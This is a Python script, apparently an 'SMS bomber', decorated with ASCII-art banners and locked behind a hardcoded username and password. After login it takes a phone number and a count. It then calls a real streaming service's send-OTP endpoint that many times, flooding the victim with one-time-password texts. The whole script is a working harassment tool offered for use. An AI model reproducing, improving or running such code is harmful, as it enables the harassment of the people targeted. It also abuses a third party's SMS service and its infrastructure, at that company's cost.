import requests
import time 
import os
import sys 
import xdg

blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'



def alamin(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.006)

alamin(cyan+"""________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$______________________$$$\n _______$$$____________________$$\n ________$$____________________$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$""")




def c (z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.001)
        
        
c("\npeles inter your username and Password ")





x=3
while x<5:
     username=str(input("\nUsername: "))
     password=str(input("\nPassword: "))
     
     if username=="alamin" and password=="alamin":
      print("Login Succcessfull")
      x=8
     else:
      print("Username or password incorrect")
      x=3
      
     







  
 
        

os.system('clear')



def logop(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.04)



logop(green+"""                  
     /\   | |ALAMIN  /\   |\     /| | | | |  | |
    /  \  | |       /  \  | \   / | | | |  \ | |
   / /\ \ | |      / /\ \ | |\/ | | | | | | \  |
  / ____ \| |____ / /__\_\| |   | | | | | |\ \ |
 /_/    \_\______/_/    \_\_|   |_| | | | | \ \|'""")
 
 
 
number=str(input(green+"\n Enter The Number : "))

amount=int(input(red+"\nEnter The Amount : "))

alamin="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"


for i in range(amount):
    requests.get(alamin)
    print(str(i+1)+"ALAMIN SMS Sent")
    
    
 
os.system('clear')   

print("""
     
     
     .  █▀██▀█─▀██▀─▀█▀────█─────▀██▄─▀█▀─▀██▀▄█▀
        \033[1;92m──██────██▄▄▄█────▄██─────██▀▄─█───███▀
        \033[1;93m──██────██───█───▄█▄██────██─▀▄█───██▀█
        \033[1;94m─▄██▄──▄██▄─▄█▄─▄█▄─▄██▄─▄██▄─▀█──▄██▄▀█▄

        \033[1;95m───────▀█▄──▄█▀──▄█▀█▄──██───██──────────
        \033[1;96m────────▀█▄▄█▀──██───██─██───██──────────
        \033[1;94m──────────██────██───██─██───██──────────
        \033[1;93m─────────▄██▄────▀█▄█▀───▀█▄█▀───────────""")